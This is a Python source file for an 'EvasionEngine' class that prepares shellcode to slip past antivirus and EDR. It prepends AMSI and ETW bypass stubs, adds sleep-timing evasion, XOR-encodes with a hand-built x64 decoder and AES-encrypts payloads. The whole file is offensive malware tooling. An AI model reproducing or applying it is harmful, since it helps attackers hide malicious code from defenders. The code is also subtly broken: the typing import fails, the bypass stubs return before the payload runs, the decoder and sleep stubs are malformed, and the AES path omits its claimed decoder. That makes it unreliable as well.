import random
import base64
from typing import bytes, Optional

class EvasionEngine:
    """AV/EDR evasion techniques"""
    
    def __init__(self):
        self.techniques = {
            "amsi": self._amsi_bypass,
            "etw": self._etw_bypass,
            "sleep": self._sleep_obfuscation,
            "xor": self._xor_encode,
            "aes": self._aes_encrypt
        }
    
    def apply(self, shellcode: bytes, technique: str = "xor") -> bytes:
        """Apply evasion technique to shellcode"""
        if technique in self.techniques:
            return self.techniques[technique](shellcode)
        return shellcode
    
    def _amsi_bypass(self, shellcode: bytes) -> bytes:
        """Prepend AMSI bypass stub"""
        # AMSI bypass patch for PowerShell
        amsi_stub = bytes([
            0x48, 0x31, 0xc0,  # xor rax, rax
            0x48, 0x89, 0x05,  # mov [rel addr], rax
            0x00, 0x00, 0x00, 0x00,
            0xc3                 # ret
        ])
        return amsi_stub + shellcode
    
    def _etw_bypass(self, shellcode: bytes) -> bytes:
        """Prepend ETW bypass stub"""
        etw_stub = bytes([
            0x48, 0x31, 0xc0,  # xor rax, rax
            0xc3                 # ret
        ])
        return etw_stub + shellcode
    
    def _sleep_obfuscation(self, shellcode: bytes) -> bytes:
        """Add sleep-based timing evasion"""
        # Insert sleep calls between operations
        # Simplified: just prepend a delay stub
        sleep_stub = bytes([
            0x48, 0xc7, 0xc0, 0x88, 0x13, 0x00, 0x00,  # mov rax, 5000
            0x48, 0x89, 0xc7,                             # mov rdi, rax
            0xb8, 0x23, 0x00, 0x00, 0x00,                # mov eax, 35 (nanosleep)
            0x0f, 0x05                                    # syscall
        ])
        return sleep_stub + shellcode
    
    def _xor_encode(self, shellcode: bytes, key: Optional[bytes] = None) -> bytes:
        """XOR encode shellcode with random key"""
        if key is None:
            key = bytes([random.randint(1, 255) for _ in range(16)])
        
        encoded = bytearray()
        for i, b in enumerate(shellcode):
            encoded.append(b ^ key[i % len(key)])
        
        # Return decoder stub + key + encoded payload
        decoder = self._build_xor_decoder(len(key))
        return decoder + key + bytes(encoded)
    
    def _build_xor_decoder(self, key_len: int) -> bytes:
        """Build XOR decoder stub"""
        # Simplified x64 decoder
        return bytes([
            0xeb, 0x10,  # jmp to call
            0x5e,        # pop rsi (payload addr)
            0x48, 0x31, 0xc9,  # xor rcx, rcx
            0x48, 0x31, 0xdb,  # xor rbx, rbx
            0x8a, 0x1c, 0x0e,  # mov bl, [rsi + rcx]
            0x48, 0x31, 0xd8,  # xor rax, rbx
            0x88, 0x04, 0x0e,  # mov [rsi + rcx], al
            0x48, 0xff, 0xc1,  # inc rcx
            0xeb, 0xf0,  # loop
            0xe8, 0xeb, 0xff, 0xff, 0xff  # call back
        ])
    
    def _aes_encrypt(self, shellcode: bytes) -> bytes:
        """AES encrypt shellcode"""
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            
            key = bytes([random.randint(0, 255) for _ in range(32)])
            iv = bytes([random.randint(0, 255) for _ in range(16)])
            
            padder = lambda x: x + b"\x00" * (16 - len(x) % 16)
            padded = padder(shellcode)
            
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            encrypted = encryptor.update(padded) + encryptor.finalize()
            
            # Return AES decoder stub + key + iv + encrypted
            return key + iv + encrypted
        except ImportError:
            return self._xor_encode(shellcode)
